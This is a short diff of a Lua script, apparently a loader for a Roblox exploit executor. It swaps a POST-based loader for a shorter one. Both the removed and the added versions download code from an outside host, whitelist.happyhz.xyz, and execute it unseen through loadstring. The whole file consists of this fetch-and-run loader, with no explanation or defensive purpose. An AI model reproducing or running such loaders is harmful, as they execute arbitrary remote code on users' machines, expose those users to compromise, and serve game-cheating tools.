@@ -1,20 +1,2 @@
-local url = "http://whitelist.happyhz.xyz:1599/loadscript"
-local postData = "happyhz=true"
-local headers = {
-    ["Content-Type"] = "application/x-www-form-urlencoded",
-    ["Content-Length"] = tostring(#postData)
-}
-
-local httpRequest = http_request or request or HttpPost or syn.request
-local response = httpRequest({
-    Url = url,
-    Method = "POST",
-    Headers = headers,
-    Body = postData
-})
-
-if response.Success then
-    loadstring(response.Body)()
-else
-    warn("Error occurred: " .. response.StatusMessage)
-end
+local script = game:HttpGet("http://whitelist.happyhz.xyz/test.php")
+loadstring(script)()
